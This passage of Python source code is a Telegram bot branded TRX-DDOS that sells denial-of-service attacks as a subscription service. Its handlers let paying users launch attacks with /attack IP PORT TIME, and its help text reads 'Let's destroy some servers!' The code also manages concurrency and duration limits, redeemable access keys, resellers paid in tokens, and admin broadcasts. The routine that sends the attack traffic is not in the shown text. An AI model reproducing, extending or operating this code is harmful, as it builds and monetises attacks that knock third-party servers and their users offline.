            return f"⏳ Wait {int(remaining)}s"
    return "✅ Ready"

# ============================================
# COMMAND HANDLERS
# ============================================

def handle_start(chat_id, user_id):
    if is_bot_off:
        return
    
    if chat_id < 0 and not is_group_allowed(chat_id):
        send_msg(chat_id, "❌ This group is not approved!")
        return
    
    if not is_user(user_id) and not is_reseller(user_id):
        send_msg(chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━
🚀 **Welcome to Premium Bot** 🚀
━━━━━━━━━━━━━━━━━━━━━━━━
⚔️ /attack IP PORT TIME - Start attack
🛑 /stop - Stop your attack
📊 /status - Check active attacks
🆔 /id - Your ID
🔑 /redeem KEY - Redeem key
📋 /myplan - Check your plan
📜 /rules - Bot rules
ℹ️ /help - Help menu
━━━━━━━━━━━━━━━━━━━━━━━━
🔥 Let's destroy some servers!
━━━━━━━━━━━━━━━━━━━━━━━━""")
        return
    
    if is_admin(user_id):
        send_msg(chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━  
   ⚡ ADMIN PANEL ⚡    
━━━━━━━━━━━━━━━━━━━━━━━━
📌 𝐓𝐑𝐗-𝐃𝐃𝐎𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒
━━━━━━━━━━━━━━━━━━━━━━━━
⚔️ /attack IP PORT TIME - Start attack
🛑 /stop - Stop your attack
📊 /status - Check active attacks
🆔 /id - Your ID
🔑 /redeem KEY - Redeem key
📋 /myplan - Check your plan
📜 /rules - Bot rules
ℹ️ /help - Help menu
━━━━━━━━━━━━━━━━━━━━━━━━
👑 𝐀𝐃𝐌𝐈𝐍 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒
━━━━━━━━━━━━━━━━━━━━━━━━
👥 𝐔𝐒𝐄𝐑 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓
/adduser ID DAYS - Add user
/removeuser ID - Remove user
/broadcast [MESSAGE] - Broadcast
/alluser - List all users
━━━━━━━━━━━━━━━━━━━━━━━━
👥 𝐆𝐑𝐎𝐔𝐏 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓
/addgroup ID DAYS - Add group
/removegroup ID - Remove group
/groups - List groups
━━━━━━━━━━━━━━━━━━━━━━━━
⚙️ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒
/settime SEC - Set max time
/setmaxconcurrent NUM - Set concurrent
/setcooldown SEC - Set cooldown
/setdaily LIMIT - Set daily limit
/settings - Show settings
━━━━━━━━━━━━━━━━━━━━━━━━
🔑 𝐊𝐄𝐘 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓
/genbasic PREFIX DURATION - Basic key
/genpremium PREFIX DURATION - Premium key
/keys - List keys
/deletekeys - Delete keys
/blockkey KEY - Block key
/unblockkey KEY - Unblock key
━━━━━━━━━━━━━━━━━━━━━━━━
💼 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓
/addreseller ID TOKENS - Add reseller
/removereseller ID - Remove reseller
/resellers - List resellers
/unlimited ID - Make unlimited
/limited ID TOKENS - Make limited
━━━━━━━━━━━━━━━━━━━━━━━━
💾 𝐁𝐀𝐂𝐊𝐔𝐏
/getjson - Get JSON backups
━━━━━━━━━━━━━━━━━━━━━━━━""")
        
    elif is_reseller(user_id):
        tokens = get_reseller_tokens(user_id)
        keys_count = len(get_reseller_keys(user_id))
        blocked_count = len(get_reseller_blocked_keys(user_id))
        send_msg(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
  💼 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐏𝐀𝐍𝐄𝐋
━━━━━━━━━━━━━━━━━━━━━━━━
  🎫 Tokens: {tokens}
  🔑 Keys: {keys_count}
  🚫 Blocked: {blocked_count}
━━━━━━━━━━━━━━━━━━━━━━━━
📌 𝐔𝐒𝐄𝐑 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒
/attack IP PORT TIME - Start Attack
/stop - Stop Attack
/id - Get Your ID
/rules - Bot Rules
/redeem KEY - Get access
/myplan - Check your plan
━━━━━━━━━━━━━━━━━━━━━━━━
📌 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒
/genkey - Generate Keys
/deletekey - Delete Keys
/blockkey KEY - Block Key
/unblockkey KEY - Unblock Key
/myblockedkeys - Show Blocked Keys
━━━━━━━━━━━━━━━━━━━━━━━━""")
    else:
        expiry = get_user_expiry(user_id)
        plan = get_plan_name(user_id)
        limits = get_user_limits(user_id)
        send_msg(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
  ⚡ 𝐓𝐑𝐗-𝐃𝐃𝐎𝐒 𝐔𝐒𝐄𝐑
━━━━━━━━━━━━━━━━━━━━━━━━
  ✅ Approved
  📅 Expires: {expiry}
  🌟 Plan: {plan}
━━━━━━━━━━━━━━━━━━━━━━━━
📌 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒
/attack IP PORT TIME - Start attack
/stop - Stop your attack
/status - Check active attacks
/id - Your ID
/redeem KEY - Redeem key
/myplan - Check your plan
/rules - Bot rules
/help - Help menu
━━━━━━━━━━━━━━━━━━━━━━━━""")

def handle_attack(chat_id, user_id, username, args):
    if is_bot_off:
        return
    
    # Check authorization
    user_id_str = str(user_id)
    is_authorized = False
    
    if is_admin(user_id) or is_reseller(user_id):
        is_authorized = True
    elif user_id_str in users and time.time() < users[user_id_str]:
        if user_id_str in user_key_map:
            key = user_key_map[user_id_str]
            if not is_key_blocked(key):
                is_authorized = True
        else:
            is_authorized = True
    
    if not is_authorized:
        send_msg(chat_id, "❌ NO ACTIVE SUBSCRIPTION!\nUse /redeem KEY to get access.")
        return
    
    if is_locked and not is_admin(user_id):
        send_msg(chat_id, "🔒 Bot is locked!")
        return
    if is_maintenance and not is_admin(user_id):
        send_msg(chat_id, "🔧 Bot is under maintenance!")
        return
    if chat_id < 0 and not is_group_allowed(chat_id):
        send_msg(chat_id, "❌ This group is not authorized!")
        return
    
    valid, msg = is_user_valid(user_id)
    if not valid:
        send_msg(chat_id, msg)
        return
    
    limits = get_user_limits(user_id)
    current = len(active_attacks)
    if current >= limits['max_concurrent']:
        send_msg(chat_id, f"❌ MAX CONCURRENT LIMIT!\n⚡ {current}/{limits['max_concurrent']}\n⏳ Please wait for a free slot")
        return
    
    if len(args) != 3:
        send_msg(chat_id, "Usage: /attack IP PORT TIME\nExample: /attack 1.1.1.1 80 60")
        return
    
    ip, port, sec = args[0], int(args[1]), int(args[2])
    if sec < 10:
        sec = 10
    if sec > limits['max_time']:
        send_msg(chat_id, f"❌ Max duration is {limits['max_time']}s! You sent {sec}s")
        return
    
    can, can_msg = can_attack(user_id)
    if not can:
        send_msg(chat_id, can_msg)
        return
    
    attack_id = f"{int(time.time())}_{user_id}"
    
    with attack_lock:
        active_attacks[attack_id] = {
            'ip': ip, 'port': port, 'duration': sec, 'remaining': sec,
            'percent': 0, 'user_id': user_id, 'username': username,
            'start_time': time.time()
        }
    
    add_attack_count(user_id)
    
    threading.Thread(target=run_attack, args=(attack_id, chat_id, ip, port, sec, user_id, username), daemon=True).start()

def handle_status(chat_id, user_id):
    if is_bot_off:
        return
    
    if chat_id < 0 and not is_group_allowed(chat_id):
        send_msg(chat_id, "❌ This group is not authorized!")
        return
    
    send_status(chat_id, user_id)

def handle_stop(chat_id, user_id):
    if is_bot_off:
        return
    
    if is_locked and not is_admin(user_id):
        send_msg(chat_id, "🔒 Bot is locked!")
        return
    
    with attack_lock:
        if is_admin(user_id):
            count = len(active_attacks)
            active_attacks.clear()
            send_msg(chat_id, f"🛑 STOPPED {count} active attacks (Admin)!")
        else:
            my_attacks = [aid for aid, att in list(active_attacks.items()) if att['user_id'] == user_id]
            for aid in my_attacks:
                del active_attacks[aid]
            if my_attacks:
                send_msg(chat_id, f"🛑 Stopped {len(my_attacks)} of your attack(s)!")
            else:
                send_msg(chat_id, "❌ No active attack found from your ID!")

def handle_redeem(chat_id, user_id, args):
    if is_bot_off:
        return
    
    if len(args) != 1:
        send_msg(chat_id, "Usage: /redeem KEY\nExample: /redeem TRX-ABCD1234")
        return
    success, msg = redeem_key(user_id, args[0].upper())
    send_msg(chat_id, msg)

def handle_id(chat_id, user_id):
    if is_bot_off:
        return
    
    if not is_user(user_id) and not is_reseller(user_id):
        send_msg(chat_id, "❌ Not approved!")
        return
    if is_admin(user_id):
        send_msg(chat_id, f"🆔 YOUR ID: {user_id}\n👑 ADMIN")
    elif is_reseller(user_id):
        tokens = get_reseller_tokens(user_id)
        send_msg(chat_id, f"🆔 YOUR ID: {user_id}\n💼 RESELLER\n🎫 Tokens: {tokens}")
    else:
        expiry = get_user_expiry(user_id)
        plan = get_plan_name(user_id)
        send_msg(chat_id, f"🆔 YOUR ID: {user_id}\n✅ User\n📅 Expires: {expiry}\n🌟 Plan: {plan}")

def handle_rules(chat_id, user_id):
    if is_bot_off:
        return
    send_msg(chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━
📜 **BOT RULES**
━━━━━━━━━━━━━━━━━━━━━━━━
1. No spamming attacks
2. Play smart
3. No mods
4. Be respectful
5. Report issues to admin
━━━━━━━━━━━━━━━━━━━━━━━━""")

def handle_help(chat_id, user_id):
    if is_bot_off:
        return
    
    if chat_id < 0 and not is_group_allowed(chat_id):
        send_msg(chat_id, "❌ This group is not authorized!")
        return
    
    if is_admin(user_id):
        send_msg(chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━
👑 **TRX-DDOS ADMIN HELP**
━━━━━━━━━━━━━━━━━━━━━━━━
👥 𝐔𝐒𝐄𝐑 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓
/adduser ID DAYS - Add user
/removeuser ID - Remove user
/broadcast [MESSAGE] - Broadcast
/alluser - List all users
━━━━━━━━━━━━━━━━━━━━━━━━
👥 𝐆𝐑𝐎𝐔𝐏 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓
/addgroup ID DAYS - Add group
/removegroup ID - Remove group
/groups - List groups
━━━━━━━━━━━━━━━━━━━━━━━━
⚙️ 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒
/settime SEC - Set max time
/setmaxconcurrent NUM - Set concurrent
/setcooldown SEC - Set cooldown
/setdaily LIMIT - Set daily limit
/settings - Show settings
━━━━━━━━━━━━━━━━━━━━━━━━
🔑 𝐊𝐄𝐘 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓
/genbasic PREFIX DURATION - Basic key
/genpremium PREFIX DURATION - Premium key
/keys - List keys
/deletekeys - Delete keys
/blockkey KEY - Block key
/unblockkey KEY - Unblock key
━━━━━━━━━━━━━━━━━━━━━━━━
💼 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓
/addreseller ID TOKENS - Add reseller
/removereseller ID - Remove reseller
/resellers - List resellers
/unlimited ID - Make unlimited
/limited ID TOKENS - Make limited
━━━━━━━━━━━━━━━━━━━━━━━━
💾 𝐁𝐀𝐂𝐊𝐔𝐏
/getjson - Get JSON backups
━━━━━━━━━━━━━━━━━━━━━━━━""")
    elif is_reseller(user_id):
        send_msg(chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━
💼 **RESELLER HELP**
━━━━━━━━━━━━━━━━━━━━━━━━
/attack IP PORT TIME - Start Attack
/stop - Stop Attack
/id - Get Your ID
/rules - Bot Rules
/redeem KEY - Get access
/myplan - Check your plan
/genkey - Generate Keys
/deletekey - Delete Your Keys
/blockkey KEY - Block Your Key
/unblockkey KEY - Unblock Your Key
/myblockedkeys - Show Blocked Keys
━━━━━━━━━━━━━━━━━━━━━━━━""")
    else:
        send_msg(chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━
📌 **USER COMMANDS**
━━━━━━━━━━━━━━━━━━━━━━━━
/attack IP PORT TIME - Start attack
/stop - Stop your attack
/status - Check active attacks
/id - Your ID
/redeem KEY - Redeem key
/myplan - Check your plan
/rules - Bot rules
/help - Help menu
━━━━━━━━━━━━━━━━━━━━━━━━""")

def handle_settings(chat_id, user_id):
    if is_bot_off:
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin Only!")
        return
    send_msg(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
⚙️ **CURRENT SETTINGS**
━━━━━━━━━━━━━━━━━━━━━━━━
🎯 Max Concurrent: {MAX_CONCURRENT}
⏱️ Max Time: {MAX_TIME}s
⏳ Cooldown: {COOLDOWN_SECONDS}s
📊 Daily Limit: {DAILY_LIMIT}
🔒 Bot Locked: {'YES' if is_locked else 'NO'}
🔧 Maintenance: {'YES' if is_maintenance else 'NO'}
━━━━━━━━━━━━━━━━━━━━━━━━""")

# Admin Settings
def handle_setmaxconcurrent(chat_id, user_id, args):
    if is_bot_off:
        return
    
    global MAX_CONCURRENT
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin Only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /setmaxconcurrent NUM")
        return
    try:
        MAX_CONCURRENT = int(args[0])
        save_data()
        send_msg(chat_id, f"✅ Max concurrent attacks set to {MAX_CONCURRENT}")
    except:
        send_msg(chat_id, "❌ Invalid number!")

def handle_settime(chat_id, user_id, args):
    if is_bot_off:
        return
    
    global MAX_TIME
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin Only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /settime SEC")
        return
    try:
        MAX_TIME = int(args[0])
        save_data()
        send_msg(chat_id, f"✅ Max time set to {MAX_TIME}s")
    except:
        send_msg(chat_id, "❌ Invalid number!")

def handle_setcooldown(chat_id, user_id, args):
    if is_bot_off:
        return
    
    global COOLDOWN_SECONDS
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin Only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /setcooldown SEC")
        return
    try:
        COOLDOWN_SECONDS = int(args[0])
        save_data()
        send_msg(chat_id, f"✅ Cooldown set to {COOLDOWN_SECONDS}s")
    except:
        send_msg(chat_id, "❌ Invalid number!")

def handle_setdaily(chat_id, user_id, args):
    if is_bot_off:
        return
    
    global DAILY_LIMIT
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin Only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /setdaily LIMIT")
        return
    try:
        DAILY_LIMIT = int(args[0])
        save_data()
        send_msg(chat_id, f"✅ Daily limit set to {DAILY_LIMIT}")
    except:
        send_msg(chat_id, "❌ Invalid number!")

def handle_lock(chat_id, user_id):
    if is_bot_off:
        return
    
    global is_locked
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    is_locked = True
    save_data()
    send_msg(chat_id, "🔒 Bot Locked!")

def handle_unlock(chat_id, user_id):
    if is_bot_off:
        return
    
    global is_locked
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    is_locked = False
    save_data()
    send_msg(chat_id, "🔓 Bot Unlocked!")

def handle_maintenance(chat_id, user_id, args):
    if is_bot_off:
        return
    
    global is_maintenance
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /maintenance on/off")
        return
    if args[0].lower() == "on":
        is_maintenance = True
        save_data()
        send_msg(chat_id, "🔧 Maintenance Mode ON!")
    elif args[0].lower() == "off":
        is_maintenance = False
        save_data()
        send_msg(chat_id, "✅ Maintenance Mode OFF!")
    else:
        send_msg(chat_id, "Usage: /maintenance on/off")

# Admin User Management
def handle_adduser(chat_id, user_id, args):
    if is_bot_off:
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if len(args) != 2:
        send_msg(chat_id, "Usage: /adduser ID DAYS\nExample: /adduser 123456789 30")
        return
    try:
        uid = int(args[0])
        days = int(args[1])
        add_user(uid, days, 0)
        send_msg(chat_id, f"✅ User {uid} added for {days} days!")
    except:
        send_msg(chat_id, "❌ Invalid ID or days!")

def handle_removeuser(chat_id, user_id, args):
    if is_bot_off:
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /removeuser ID\nExample: /removeuser 123456789")
        return
    try:
        uid = int(args[0])
        remove_user(uid)
        send_msg(chat_id, f"✅ User {uid} removed!")
    except:
        send_msg(chat_id, "❌ Invalid ID!")

def handle_addgroup(chat_id, user_id, args):
    if is_bot_off:
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if len(args) != 2:
        send_msg(chat_id, "Usage: /addgroup GROUP_ID DAYS\nExample: /addgroup -100123456789 30")
        return
    try:
        gid = int(args[0])
        days = int(args[1])
        add_group(gid, days)
        send_msg(chat_id, f"✅ Group {gid} added for {days} days!")
    except:
        send_msg(chat_id, "❌ Invalid Group ID or days!")

def handle_removegroup(chat_id, user_id, args):
    if is_bot_off:
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /removegroup GROUP_ID\nExample: /removegroup -100123456789")
        return
    try:
        gid = int(args[0])
        remove_group(gid)
        send_msg(chat_id, f"✅ Group {gid} removed!")
    except:
        send_msg(chat_id, "❌ Invalid Group ID!")

def handle_groups(chat_id, user_id):
    if is_bot_off:
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if not groups:
        send_msg(chat_id, "📋 No groups added yet!")
        return
    msg = "📋 AUTHORIZED GROUPS\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for gid, expiry in groups.items():
        remaining = expiry - time.time()
        if remaining <= 0:
            msg += f"🆔 {gid}\n❌ EXPIRED\n"
        else:
            days = int(remaining // 86400)
            hours = int((remaining % 86400) // 3600)
            msg += f"🆔 {gid}\n✅ Active: {days}d {hours}h\n"
    send_msg(chat_id, msg[:4000])

# Broadcast
def handle_broadcast(chat_id, user_id, args):
    if is_bot_off:
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    
    if not args:
        send_msg(chat_id, "Usage: /broadcast YOUR MESSAGE")
        return
    
    broadcast_msg = " ".join(args)
    full_msg = f"""
━━━━━━━━━━━━━━━━━━━━━━━━
📢 **ADMIN BROADCAST**
━━━━━━━━━━━━━━━━━━━━━━━━
{broadcast_msg}
━━━━━━━━━━━━━━━━━━━━━━━━
📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    send_msg(chat_id, "⏳ Sending broadcast...")
    
    success_count = 0
    fail_count = 0
    
    for uid in list(users.keys()):
        try:
            requests.post(
                f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                json={"chat_id": int(uid), "text": full_msg},
                timeout=5
            )
            success_count += 1
        except:
            fail_count += 1
        time.sleep(0.05)
    
    send_msg(chat_id, f"✅ Broadcast sent to {success_count} users! ❌ Failed: {fail_count}")

def handle_alluser(chat_id, user_id):
    if is_bot_off:
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    
    filtered_users = {}
    for uid, expiry in users.items():
        uid_int = int(uid)
        if uid_int not in ADMIN_IDS:
            filtered_users[uid] = expiry
    
    if not filtered_users:
        send_msg(chat_id, "📋 No users found!")
        return
    
    user_list = []
    expired_users = []
    
    for uid, expiry in filtered_users.items():
        remaining = expiry - time.time()
        if remaining <= 0:
            expired_users.append(f"🆔 `{uid}` | ❌ EXPIRED")
        else:
            days = int(remaining // 86400)
            hours = int((remaining % 86400) // 3600)
            user_list.append(f"🆔 `{uid}` | ✅ {days}d {hours}h")
    
    msg = f"📊 **ALL USERS**\n━━━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"📈 Total: {len(filtered_users)} | ✅ Active: {len(user_list)} | ❌ Expired: {len(expired_users)}\n\n"
    
    if user_list:
        msg += f"👥 ACTIVE USERS ({len(user_list)}):\n"
        msg += "\n".join(user_list[:20])
        if len(user_list) > 20:
            msg += f"\n... and {len(user_list) - 20} more"
    
    if expired_users:
        msg += f"\n⚠️ EXPIRED USERS ({len(expired_users)}):\n"
        msg += "\n".join(expired_users[:10])
        if len(expired_users) > 10:
            msg += f"\n... and {len(expired_users) - 10} more"
    
    send_msg(chat_id, msg[:4000])

# Admin Key Management
def handle_genbasic_admin(chat_id, user_id, args):
    if is_bot_off:
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    
    if len(args) < 2:
        send_msg(chat_id, "Usage: /genbasic PREFIX DURATION\nExample: /genbasic TEST 30")
        return
    
    prefix = args[0].upper()
    duration_str = args[1].lower()
    
    key, error = generate_basic_admin_key(prefix, duration_str)
    if error:
        send_msg(chat_id, error)
        return
    
    unit, value = parse_duration(duration_str)
    plan = f"{int(value)} Days" if unit == 'days' else f"{int(value)} Hours"
    
    send_msg(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
📀 **BASIC KEY GENERATED!**
━━━━━━━━━━━━━━━━━━━━━━━━
🔑 {key}
📅 Valid: {plan}
⭐ Type: BASIC
━━━━━━━━━━━━━━━━━━━━━━━━""")

def handle_genpremium_admin(chat_id, user_id, args):
    if is_bot_off:
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    
    if len(args) < 2:
        send_msg(chat_id, "Usage: /genpremium PREFIX DURATION\nExample: /genpremium VIP 30")
        return
    
    prefix = args[0].upper()
    duration_str = args[1].lower()
    
    key, error = generate_premium_admin_key(prefix, duration_str)
    if error:
        send_msg(chat_id, error)
        return
    
    unit, value = parse_duration(duration_str)
    plan = f"{int(value)} Days" if unit == 'days' else f"{int(value)} Hours"
    
    send_msg(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
⭐ **PREMIUM KEY GENERATED!**
━━━━━━━━━━━━━━━━━━━━━━━━
🔑 {key}
📅 Valid: {plan}
⭐ Type: PREMIUM
━━━━━━━━━━━━━━━━━━━━━━━━""")

def handle_keys(chat_id, user_id):
    if is_bot_off:
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    
    if not keys:
        send_msg(chat_id, "📋 No keys available!")
        return
    
    msg = "📋 **KEYS LIST**\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for k, v in keys.items():
        key_type = "⭐" if v.get('type') == 'premium' else "📀"
        dur = f"{int(v['days'])}d" if v.get('days', 0) > 0 else f"{int(v.get('hours', 0))}h"
        status = "✅ UNUSED" if not v['used'] else f"❌ USED"
        msg += f"{key_type} `{k}` | {dur} | {status}\n"
    
    send_msg(chat_id, msg[:4000])

def handle_deletekeys(chat_id, user_id):
    if is_bot_off:
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    
    buttons = [
        [{"text": "DELETE ALL UNUSED KEYS", "callback_data": "admin_del_unused"}],
        [{"text": "DELETE ALL USED KEYS", "callback_data": "admin_del_used"}],
        [{"text": "DELETE ALL KEYS", "callback_data": "admin_del_all"}],
        [{"text": "❌ CANCEL", "callback_data": "admin_del_cancel"}]
    ]
    send_buttons(chat_id, "🗑️ DELETE KEYS", buttons)

def handle_blockkey_admin(chat_id, user_id, args):
    if is_bot_off:
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /blockkey KEY")
        return
    key = args[0].upper()
    if key not in keys:
        send_msg(chat_id, "❌ Key not found!")
        return
    if keys[key].get('blocked', False):
        send_msg(chat_id, "❌ Key already blocked!")
        return
    
    expire_user_by_key(key)
    keys[key]['blocked'] = True
    save_data()
    send_msg(chat_id, f"✅ Key {key} blocked!")

def handle_unblockkey_admin(chat_id, user_id, args):
    if is_bot_off:
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /unblockkey KEY")
        return
    key = args[0].upper()
    if key not in keys:
        send_msg(chat_id, "❌ Key not found!")
        return
    if not keys[key].get('blocked', False):
        send_msg(chat_id, "❌ Key is not blocked!")
        return
    
    used_by = keys[key].get('used_by')
    if used_by:
        days = keys[key]['days']
        hours = keys[key].get('hours', 0)
        current_time = time.time()
        expiry_seconds = (days * 86400) + (hours * 3600)
        users[used_by] = current_time + expiry_seconds
        user_key_map[used_by] = key
    
    keys[key]['blocked'] = False
    save_data()
    send_msg(chat_id, f"✅ Key {key} unblocked!")

# Admin Reseller Management
def handle_addreseller(chat_id, user_id, args):
    if is_bot_off:
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if len(args) != 2:
        send_msg(chat_id, "Usage: /addreseller ID TOKENS\nExample: /addreseller 123456789 100")
        return
    try:
        nid = int(args[0])
        tokens = int(args[1])
        add_reseller(nid, tokens, False)
        send_msg(chat_id, f"✅ Reseller {nid} added with {tokens} tokens!")
    except:
        send_msg(chat_id, "❌ Invalid ID or tokens!")

def handle_removereseller(chat_id, user_id, args):
    if is_bot_off:
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /removereseller ID\nExample: /removereseller 123456789")
        return
    try:
        rid = int(args[0])
        remove_reseller(rid)
        send_msg(chat_id, f"✅ Reseller {rid} removed!")
    except:
        send_msg(chat_id, "❌ Invalid ID!")

def handle_resellers(chat_id, user_id):
    if is_bot_off:
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if not resellers:
        send_msg(chat_id, "📋 No resellers added yet!")
        return
    msg = "📋 RESELLERS LIST\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for rid, data in resellers.items():
        tokens = "∞" if data.get('unlimited', False) else data['tokens']
        msg += f"🆔 {rid}\n💰 Tokens: {tokens}\n📈 Earned: {data['total_earned']}\n"
    send_msg(chat_id, msg[:4000])

def handle_unlimited(chat_id, user_id, args):
    if is_bot_off:
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /unlimited ID\nExample: /unlimited 123456789")
        return
    try:
        rid = int(args[0])
        if str(rid) in resellers:
            resellers[str(rid)]['unlimited'] = True
            resellers[str(rid)]['tokens'] = -1
            save_data()
            send_msg(chat_id, f"✅ Reseller {rid} now has UNLIMITED tokens!")
        else:
            send_msg(chat_id, "❌ Reseller not found!")
    except:
        send_msg(chat_id, "❌ Invalid ID!")

def handle_limited(chat_id, user_id, args):
    if is_bot_off:
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if len(args) != 2:
        send_msg(chat_id, "Usage: /limited ID TOKENS\nExample: /limited 123456789 50")
        return
    try:
        rid = int(args[0])
        tokens = int(args[1])
        if str(rid) in resellers:
            resellers[str(rid)]['unlimited'] = False
            resellers[str(rid)]['tokens'] = tokens
            save_data()
            send_msg(chat_id, f"✅ Reseller {rid} now has LIMITED tokens: {tokens}")
        else:
            send_msg(chat_id, "❌ Reseller not found!")
    except:
        send_msg(chat_id, "❌ Invalid ID or tokens!")

# Reseller Commands - Premium & Basic Inline Buttons
def handle_genkey_reseller(chat_id, user_id):
    if is_bot_off:
        return
    
    if not is_reseller(user_id):
        send_msg(chat_id, "❌ Only for resellers!")
        return
    
    buttons = [
        [{"text": "📀 BASIC KEYS", "callback_data": "genkey_basic_menu"}],
        [{"text": "🌟 PREMIUM KEYS", "callback_data": "genkey_premium_menu"}],
        [{"text": "❌ CANCEL", "callback_data": "genkey_cancel"}]
    ]
    send_buttons(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
💼 **RESELLER KEY GENERATION**
━━━━━━━━━━━━━━━━━━━━━━━━
💰 Balance: {get_reseller_tokens(user_id)}
━━━━━━━━━━━━━━━━━━━━━━━━
📀 BASIC = 1x Power (6 Concurrent, 300s)
🌟 PREMIUM = 2x Power (12 Concurrent, 600s)
━━━━━━━━━━━━━━━━━━━━━━━━
Select key type below:
━━━━━━━━━━━━━━━━━━━━━━━━""", buttons)

def handle_genkey_basic_callback(callback_query):
    user_id = callback_query["from"]["id"]
    chat_id = callback_query["message"]["chat"]["id"]
    msg_id = callback_query["message"]["message_id"]
    cb_id = callback_query["id"]
    
    if not is_reseller(user_id):
        answer_callback(cb_id, "❌ Reseller only!")
        return
    
    answer_callback(cb_id)
    del_msg(chat_id, msg_id)
    
    buttons = [
        [{"text": "🕐 1 HOUR - 1 TOKEN", "callback_data": "genkey_basic_1h"}],
        [{"text": "🕐 5 HOURS - 3 TOKENS", "callback_data": "genkey_basic_5h"}],
        [{"text": "📅 1 DAY - 4 TOKENS", "callback_data": "genkey_basic_1d"}],
        [{"text": "📅 3 DAYS - 8 TOKENS", "callback_data": "genkey_basic_3d"}],
        [{"text": "📅 7 DAYS - 15 TOKENS", "callback_data": "genkey_basic_7d"}],
        [{"text": "📅 14 DAYS - 25 TOKENS", "callback_data": "genkey_basic_14d"}],
        [{"text": "📅 30 DAYS - 50 TOKENS", "callback_data": "genkey_basic_30d"}],
        [{"text": "📅 60 DAYS - 80 TOKENS", "callback_data": "genkey_basic_60d"}],
        [{"text": "🔙 BACK", "callback_data": "genkey_back"}]
    ]
    send_buttons(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
📀 **BASIC KEYS**
